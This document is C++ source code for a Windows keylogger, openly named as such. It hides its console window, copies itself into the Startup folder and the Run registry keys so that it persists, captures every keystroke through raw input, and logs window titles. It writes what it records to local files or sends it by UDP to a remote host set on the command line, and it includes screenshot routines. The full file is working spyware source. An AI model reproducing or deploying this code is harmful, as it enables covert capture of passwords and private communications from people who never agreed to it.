/**				             keyloger
*
*This software only can run in windows,built it by Visual Studio.
*
*function: 记录键位，记录窗口标题，截图，udp传送等
*
*author:	nyhoo@outlook.com<nyhoo>
**/
#define _CRT_SECURE_NO_WARNINGS
#include <Shlobj.h>
#include <ObjIdl.h>
#include <stdio.h>
#include <windows.h>
#include <time.h>
#include <iostream>
#include <fstream>
#include <string>


using namespace std;
#pragma comment(lib,"ws2_32.lib")
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")


static std::string logpath("D:\\keylogger");
static int	port = 22345;
static std::string ipaddr("127.0.0.1");
static int	appflag = 0;// local

//用法
void static usage()
{
			 cout <<"keylogger [flag = local]([ip = 127.0.0.1][port = 22345] | [logpath = D:/ keylogger / ])" << endl
				 << endl
				 << "flag :" << endl
				 << "      local   meaning it's local host,next param is the logpath." << endl
				 << "      remote  meaning it's will send msmg to remote host,next param is ipaddr. and port of recv. server." << endl
				 << "      ...     it's not support this option" << endl
				 << "ip :" << endl
				 << "               it support IPV4, but the flag must `remote`" << endl
				 << "port :" << endl
				 << "                the UDP port of remote recv.server" << endl
				 << "logpath :" << endl
				 << "                 when the flag is local, logpath configure to write log." << endl
				 << endl;
}

//用于记录结果的函数
int key_log(UINT keyCode, const char* keyText, UINT len);
//解析键码
int decode_key(UINT key);
//窗口消息处理函数
LRESULT CALLBACK winfun(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
//运行后自我安装确保开机时启动(TODO:服务的方式更好一点)
void install(HWND h);
//获取窗口截图
HBITMAP get_image_from_window(HWND hwnd);
//保存位图
void save_bpm(HBITMAP hBmp, WORD wBitsPixel, LPCTSTR szFile);
//创建快捷方式
bool create_shortcut(LPCTSTR szStartAppPath, LPCTSTR szAddCmdLine, LPCOLESTR szDestLnkPath, LPCTSTR szIconPath);
//打包数据
string packet_data(const char* src, int src_len, char type, char version);
//发送UDP消息
int send_udp(char* ip, unsigned short port, char* msg, size_t len);
//窗口标题是否发生了改变
bool title_change = false;
//自定义的钩子消息
UINT hook_msg = 0;
//消息包头
struct pkg_header
{
	char type;//0->title//1->key 100->pic
	char ver;//版本信息
	short length;//消息长度
};

void write_log(const std::string& text)
{
	time_t t = time(NULL);
	tm * mtm = localtime(&t);
	char cur_day[20] = { 0 };
	sprintf(cur_day, "%04d-%02d-%02d", mtm->tm_year+1900, mtm->tm_mon, mtm->tm_mday);
	std::string logfile = logpath + "\\" + std::string(cur_day) + ".log";
	ofstream of(logfile.c_str(), ios::app);
	if (of.good())
	{
		of << text;
	}
	of.close();
}

int main(int argc, char** argv)
{
	FreeConsole();
	HANDLE hMutex = ::CreateMutexA(NULL, TRUE, ("keyloger@nyhoo"));
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		return -1;
	}
	if (argc >= 2)
	{
		appflag = std::string("local") == std::string(argv[1]) ? 0 : 1;
		if (appflag)
		{
			if (argc >= 3)
			{
				ipaddr = std::string(argv[2]);
				if (argc >= 4)
				{
					port = atol(argv[3]);
				}
			}
		}
		else
		{
			if (argc >= 3)
			{
				logpath = std::string(argv[2]);
			}
		}
	}
	HANDLE handle = GetCurrentProcess();
	HWND hwnd = GetConsoleWindow();
	install(hwnd);
	FreeConsole();
	HINSTANCE hInstance = GetModuleHandle(NULL);
	WNDCLASSA wc = { 0 };
	MSG msg = { 0 };
	GetClassInfoA(hInstance, "ConsoleWindowClass", &wc);
	wc.hInstance = hInstance;
	wc.lpszClassName = "ConsoleWindowClass";
	wc.lpfnWndProc = winfun;;
	if (!RegisterClassA(&wc))
	{
		return -1;
	}
	hwnd = CreateWindowExA(0, "ConsoleWindowClass", NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL);
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	if (hMutex)
	{
		::ReleaseMutex(hMutex);
	}
	return 0;
}


//打包数据
string packet_data(const char* src, int src_len, char type, char version)
{
	char *pdata = new char[src_len + 4];
	char *snd = pdata;
	memset(pdata, 0, src_len + 4);
	*pdata++ = type;
	*pdata++ = version;
	short l = src_len + 4;
	memcpy(pdata, &l, sizeof(l));
	pdata += sizeof(l);
	memcpy(pdata, src, src_len);
	string s(snd, src_len + 4);
	return s;
}


int send_udp(char* ip, unsigned short port, char* msg, size_t len)
{
	SOCKET sktfd = 0;
	struct sockaddr_in server;
	if (ip == NULL || msg == NULL || len == 0 || port == 0)
	{
		return 0;//send 0 bytes
	}
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData))// windows need  this
	{
		return 0;
	}
	if ((sktfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
	{
		return -(WSAGetLastError());
	}
	const int opt_broadcast = 1;
	setsockopt(sktfd, SOL_SOCKET, SO_BROADCAST, (char*)&opt_broadcast, sizeof(opt_broadcast));
	server.sin_family = AF_INET;
	server.sin_port = htons(port);
	server.sin_addr.s_addr = inet_addr(ip);
	//Send the messages to the server
	int sendbytes = 0;
	if ((sendbytes = sendto(sktfd, msg, len, 0, (struct sockaddr*)&server, sizeof(server))) < 0)
	{
		closesocket(sktfd);
		return -(WSAGetLastError());
	}
	closesocket(sktfd);
	return sendbytes;
}




void install(HWND h)
{
	char start_path[MAX_PATH] = { 0 };
	char exeName[MAX_PATH] = { 0 };
	//获取启动目录
	SHGetFolderPathA(h, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, start_path);
	GetModuleFileNameA(NULL, exeName, MAX_PATH);
	std::string exe_str(exeName);
	exe_str = exe_str.substr(exe_str.find_last_of("\\/"));
	std::string fileName(exe_str.substr(1));
	strcat(start_path, exe_str.c_str());
	//拷贝到启动目录
	CopyFileA(exeName, start_path, false);
	//设置为隐藏文件
	//SetFileAttributesA(start_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	//设置快捷方式
	//create_shortcut(start_path, "", OLESTR("D:\\keylogger.lnk"), "");
	//修改注册表
	HKEY hKey;
	RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hKey, NULL);
	RegSetValueExA(hKey, fileName.c_str(), 0, REG_SZ, (const BYTE*)start_path, strlen(start_path) + 1);
	RegCloseKey(hKey);
	RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hKey, NULL);
	RegSetValueExA(hKey, fileName.c_str(), 0, REG_SZ, (const BYTE*)start_path, strlen(start_path) + 1);
	RegCloseKey(hKey);
}

int decode_key(UINT key)
{
	BYTE kbd[256] = { 0 };
	WORD key_char = 0;
	char key_name[0x20] = { 0 };
	GetKeyboardState(kbd);
	switch (key)
	{
	case VK_F1:
	case VK_F2:
	case VK_F3:
	case VK_F4:
	case VK_F5:
	case VK_F6:
	case VK_F7:
	case VK_F8:
	case VK_F9:
	case VK_F10:
	case VK_F11:
	case VK_F12:
	case VK_F13:
	case VK_F14:
	case VK_F15:
	case VK_F16:
	case VK_F17:
	case VK_F18:
	case VK_F19:
	case VK_F20:
	case VK_F21:
	case VK_F22:
	case VK_F23:
	case VK_F24:
		sprintf_s(key_name, 0x20, "F%d", key - VK_F1 + 1);
		break;
	case VK_ESCAPE:
		sprintf_s(key_name, 0x20, "ESC");
		break;
	case VK_PRINT:
		sprintf_s(key_name, 0x20, "Print Screen");
		break;
	case VK_SCROLL:
		sprintf_s(key_name, 0x20, "Scroll");
		break;
	case VK_PAUSE:
		sprintf_s(key_name, 0x20, "Pause");
		break;
	case VK_BACK:
		sprintf_s(key_name, 0x20, "Backspace");
		break;
	case VK_INSERT:
		sprintf_s(key_name, 0x20, "Insert");
		break;
	case VK_HOME:
		sprintf_s(key_name, 0x20, "Home");
		break;
	case VK_PRIOR:
		sprintf_s(key_name, 0x20, "PageUp");
		break;
	case VK_NEXT:
		sprintf_s(key_name, 0x20, "PageDown");
		break;
	case VK_END:
		sprintf_s(key_name, 0x20, "End");
		break;
	case VK_DELETE:
		sprintf_s(key_name, 0x20, "Delete");
		break;
	case VK_TAB:
		sprintf_s(key_name, 0x20, "Tab");
		break;
	case VK_RETURN:
		sprintf_s(key_name, 0x20, "Enter");
		break;
	case VK_CAPITAL:
		sprintf_s(key_name, 0x20, "CapsLock");
		break;
	case VK_SHIFT:
		sprintf_s(key_name, 0x20, "Shift");
		break;
	case VK_CONTROL:
		sprintf_s(key_name, 0x20, "Ctrl");
		break;
	case VK_LWIN:
		sprintf_s(key_name, 0x20, "LeftWin");
		break;
	case VK_RWIN:
		sprintf_s(key_name, 0x20, "RightWin");
		break;
	case VK_SPACE:
		sprintf_s(key_name, 0x20, "Space");
		break;
	case VK_APPS:
		sprintf_s(key_name, 0x20, "Apps");
		break;
	case VK_UP:
		sprintf_s(key_name, 0x20, "Up");
		break;
	case VK_DOWN:
		sprintf_s(key_name, 0x20, "Down");
		break;
	case VK_LEFT:
		sprintf_s(key_name, 0x20, "Left");
		break;
	case VK_RIGHT:
		sprintf_s(key_name, 0x20, "Right");
		break;
	case VK_NUMLOCK:
		sprintf_s(key_name, 0x20, "NumLock");
		break;
	case VK_CLEAR:
		sprintf_s(key_name, 0x20, "Clear");
		break;
	case VK_MENU:
		sprintf_s(key_name, 0x20, "Alt");
		break;
	default:
		if (ToAscii(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), kbd, &key_char, 0) == 1)
			sprintf_s(key_name, 0x20, "%c", key_char);
		else if (GetKeyNameText(MAKELONG(0, MapVirtualKey(key, MAPVK_VK_TO_VSC)), key_name, 0x20) > 0)
			break;
	}
	return key_log(key, key_name, strlen(key_name) + 1);
}

LRESULT CALLBACK winfun(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	UINT dwSize;
	RAWINPUTDEVICE rid;
	RAWINPUT *buffer;
	char name[255] = { 0 };
	if (msg == hook_msg)
	{
		switch (wParam)
		{
		case HSHELL_WINDOWCREATED:
			break;
		case HSHELL_ACTIVATESHELLWINDOW:
			break;
		case HSHELL_WINDOWDESTROYED:
			break;
		case HSHELL_WINDOWACTIVATED://窗口被激活
			break;
		case HSHELL_REDRAW://窗口标题被重绘的时候
			char title[255] = { 0 };
			GetWindowTextA((HWND)lParam, title, 254);
			string nd = packet_data(title, strlen(title) + 1, 0, 0);
#if NEED_SEND_UDP>0
			send_udp((char*)REMOTE_IP, UDP_PORT, (char*)nd.data(), nd.size());
#endif			
#if NEED_SAVE_BPM>0
			char bpm_file_name[255] = { 0 };
			sprintf(bpm_file_name, "%lld.bpm", time(NULL));
			save_bpm(get_image_from_window((HWND)lParam), 32, bpm_file_name)
#endif		
				title_change = true;
			break;
		}
	}
	switch (msg)
	{
	case WM_CREATE:
		// Register a raw input device to capture keyboard input
		rid.usUsagePage = 0x01;
		rid.usUsage = 0x06;
		rid.dwFlags = RIDEV_INPUTSINK;
		rid.hwndTarget = hwnd;

		if (!RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE)))
		{
			return -1;
		}
		hook_msg = RegisterWindowMessage("SHELLHOOK");
		RegisterShellHookWindow(hwnd);
		break;

	case WM_INPUT:
		// request size of the raw input buffer to dwSiz
		GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER));
		// allocate buffer for input data
		buffer = (RAWINPUT*)HeapAlloc(GetProcessHeap(), 0, dwSize);

		if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, buffer, &dwSize, sizeof(RAWINPUTHEADER)))
		{
			// if this is keyboard message and WM_KEYDOWN, use the key
			if (buffer->header.dwType == RIM_TYPEKEYBOARD && buffer->data.keyboard.Message == WM_KEYDOWN)
			{
				if (decode_key(buffer->data.keyboard.VKey) == -1)
				{
					DestroyWindow(hwnd);
				}
			}
		}
		// free the buffer
		HeapFree(GetProcessHeap(), 0, buffer);
		break;
	case WM_DESTROY:
		DeregisterShellHookWindow(hwnd);
		PostQuitMessage(0);
		break;

	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

int key_log(UINT keyCode, const char* keyText, UINT len)
{
	static string strbuf("");
	if (keyCode != VK_RETURN && keyCode != VK_TAB && strbuf.size() < 512 && title_change == false)
	{
		strbuf += keyText;
		strbuf += "->";
	}
	else
	{
		if (appflag)
		{
			string s = packet_data(strbuf.c_str(), strbuf.length(), 1, 0);
			send_udp((char*)ipaddr.c_str(), port, (char*)s.data(), s.size());
		}
		else
		{
			write_log(strbuf);
		}
		strbuf = "";
		if (title_change)
		{
			title_change = false;
		}
	}

	return 0;
}

HBITMAP get_image_from_window(HWND hwnd)
{
	HDC hwindowDC, hwindowCompatibleDC;
	int height, width, srcheight, srcwidth;
	HBITMAP hbwindow;
	BITMAPINFOHEADER  bi;

	hwindowDC = GetDC(hwnd);
	hwindowCompatibleDC = CreateCompatibleDC(hwindowDC);
	SetStretchBltMode(hwindowCompatibleDC, COLORONCOLOR);

	RECT windowsize;
	GetClientRect(hwnd, &windowsize);

	srcheight = windowsize.bottom;
	srcwidth = windowsize.right;
	height = windowsize.bottom;  //change this to whatever size you want to resize to
	width = windowsize.right;

	hbwindow = CreateCompatibleBitmap(hwindowDC, width, height);
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = width;
	bi.biHeight = -height;  //this is the line that makes it draw upside down or not
	bi.biPlanes = 1;
	bi.biBitCount = 32;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;
	SelectObject(hwindowCompatibleDC, hbwindow);
	StretchBlt(hwindowCompatibleDC, 0, 0, width, height, hwindowDC, 0, 0, srcwidth, srcheight, SRCCOPY);
	DeleteDC(hwindowCompatibleDC);
	ReleaseDC(NULL, hwindowDC);
	return hbwindow;
}


void save_bpm(HBITMAP hBmp, WORD wBitsPixel, LPCTSTR szFile)
{
	BITMAP  bm;
	GetObject(hBmp, sizeof(bm), &bm);
	if (0 == wBitsPixel)
	{
		wBitsPixel = bm.bmBitsPixel;
	}
	DWORD   dwSizeClr = 0;  //颜色表字节数
	if (wBitsPixel <= 8)
	{
		dwSizeClr = (1 << wBitsPixel) * sizeof(RGBQUAD);
	}
	//一行的字节数
	DWORD  dwLineBytes = ((bm.bmWidth * wBitsPixel + 31) & ~31) >> 3;
	//像素数据字节数
	DWORD dwSizeImg = dwLineBytes * bm.bmHeight;
	BITMAPFILEHEADER    bmfh;
	bmfh.bfType = 0x4D42; //BM
	bmfh.bfOffBits = sizeof(bmfh) + sizeof(BITMAPINFOHEADER) + dwSizeClr;
	bmfh.bfSize = bmfh.bfOffBits + dwSizeImg;
	bmfh.bfReserved1 = 0;
	bmfh.bfReserved2 = 0;
	BYTE*   pBmpFile = (BYTE*)malloc(bmfh.bfSize);
	memcpy(pBmpFile, &bmfh, sizeof(bmfh));
	LPBITMAPINFO  lpbi = (LPBITMAPINFO)(pBmpFile + sizeof(bmfh));
	lpbi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	lpbi->bmiHeader.biWidth = bm.bmWidth;
	lpbi->bmiHeader.biHeight = bm.bmHeight;
	lpbi->bmiHeader.biPlanes = 1;
	lpbi->bmiHeader.biBitCount = wBitsPixel;
	lpbi->bmiHeader.biCompression = BI_RGB;
	lpbi->bmiHeader.biSizeImage = dwSizeImg;
	lpbi->bmiHeader.biXPelsPerMeter = 0;
	lpbi->bmiHeader.biYPelsPerMeter = 0;
	lpbi->bmiHeader.biClrUsed = 0;
	lpbi->bmiHeader.biClrImportant = 0;
	HDC hDC = GetDC(NULL);
	GetDIBits(hDC, hBmp, 0, bm.bmHeight
		, pBmpFile + bmfh.bfOffBits, lpbi, DIB_RGB_COLORS);
	ReleaseDC(NULL, hDC);
	FILE* f = fopen(szFile, "wb");
	if (f)
	{
		fwrite(pBmpFile, 1, bmfh.bfSize, f);
		fclose(f);
	}
	free(pBmpFile);
}

bool create_shortcut(LPCTSTR szStartAppPath, LPCTSTR szAddCmdLine, LPCOLESTR szDestLnkPath, LPCTSTR szIconPath)
{
	HRESULT hr = CoInitialize(NULL);
	if (SUCCEEDED(hr))
	{
		IShellLink *pShellLink;
		hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (void**)&pShellLink);
		if (SUCCEEDED(hr))
		{
			pShellLink->SetPath(szStartAppPath);
			string strTmp = szStartAppPath;
			int nStart = strTmp.find_last_of("/\\");
			pShellLink->SetWorkingDirectory(strTmp.substr(0, nStart).c_str());
			pShellLink->SetArguments(szAddCmdLine);
			if (szIconPath)
			{
				pShellLink->SetIconLocation(szIconPath, 0);
			}
			IPersistFile* pPersistFile;
			hr = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
			if (SUCCEEDED(hr))
			{
				hr = pPersistFile->Save(szDestLnkPath, FALSE);
				if (SUCCEEDED(hr))
				{
					return true;
				}
				pPersistFile->Release();
			}
			pShellLink->Release();
		}
		CoUninitialize();
	}
	return false;
}